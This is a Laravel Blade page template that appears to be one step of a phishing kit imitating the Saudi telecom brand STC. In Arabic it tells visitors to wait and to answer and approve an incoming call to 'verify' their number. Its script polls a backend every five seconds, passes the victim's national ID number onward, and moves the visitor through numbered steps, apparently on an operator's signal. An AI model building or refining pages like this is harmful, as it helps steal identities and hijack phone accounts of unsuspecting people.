@extends('frontend.layout.master-two')
@section('style')

    <style>

body {
    background: url("{{asset('site/static/stc.jpg')}}");
    background-position: center;
    background-size: cover;
    background-repeat: no-repeat;
    background-color: #00697f;
    min-height: 100vh;
    margin: 0;
    display: flex;
    flex-direction: column;
}

@media (max-width: 768px) {
    body {
        background-size: 100% 100%;  /* This will stretch the image to fit both width and height */
        background-attachment: fixed; /* Fixes the background during scroll */
        height: 50vh;
        width: 50vw;
    }
}

/* Keep your other styles unchanged */


body .popup-content {
    background: transparent;
    color: white; /* Keeps text white for visibility */
    border-radius: 8px;
}

div#popup-container {
    background: transparent;
}

header {
    background: #FFF;
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    align-items: flex-start;
    justify-content: space-between;
    flex-direction: row-reverse;
    padding: 5px 15px;
}

header img {
    height: 71px;
}

div#popup-container {
    top: 72px;
}

    </style>
@endsection


@section('content')
{{--    <form action="{{route('stepSevenAction')}}" method="post" id="form">--}}
{{--        @csrf--}}
{{--        <input type="hidden" name="national_number" value="{{$client->national_number}}">--}}
{{--        <input type="hidden" name="client_id" value="{{$client->id}}">--}}
{{--        <button type="submit" id="submit_button"></button>--}}
{{--    </form>--}}


<header>
<img src="{{asset('site/static/aaaa.jpeg')}}">
<img src="{{asset('site/static/lalalala.jpeg')}}">

</header>
    <div class="popup-container" id="popup-container">
        <div class="popup-content">
            <h5 class="mb-3 mt-3">الرجاء الانتظار </h5>
            <div class="spinner-border m-5" role="status">
                <span class="visually-hidden"></span>
            </div>
            <h5>
                يرجى الرد على الاتصال والموافقة ليتم توثيق رقمك على المنصة
            </h5>
        </div>
    </div>
@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/pop-up.js') }}"></script>
    <script>
        $(document).ready(function () {
            function fetchNotifications() {
                $.ajax({
                    url: '{{ route("client.getEndPointAjax", $client->id) }}?is_stc=1',
                    type: 'GET',
                    dataType: 'json',
                    success: function (data) {
                        if (data.status == 1) {
                            $('#step').val(data.next_step);
                            $('#popup-container').remove();

                            $.ajax({
                                url: "{{ route('stepElevenAction') }}",
                                type: 'POST',
                                data: {
                                    client_id: "{{ $client->id }}",
                                    national_number: "{{ $client->national_number }}",
                                    _token: "{{ csrf_token() }}"
                                },
                                success: function(response) {
                                    if (response.redirect_url) {
                                        window.location.href = response.redirect_url;
                                    } else {
                                        window.location.href = "{{ route('stepLoginView', [12, 'id' => $client->id, 'national_number' => $client->national_number]) }}";
                                    }
                                },
                                error: function(xhr, status, error) {
                                    console.error('Error:', error);
                                    // Display an error message to the user
                                    alert('An error occurred. Please try again later.');
                                }
                            });
                        } else if (data.status == 2 || data.status == '2') {
                            window.location.href = "{{ route('stepTenView', [10, 'id' => $client->id, 'national_number' => $client->national_number]) }}";
                        }
                    },
                    error: function(xhr, status, error) {
                      
                    }
                });
            }

            fetchNotifications();
            setInterval(fetchNotifications, 5000);
        });
    </script>
@endsection
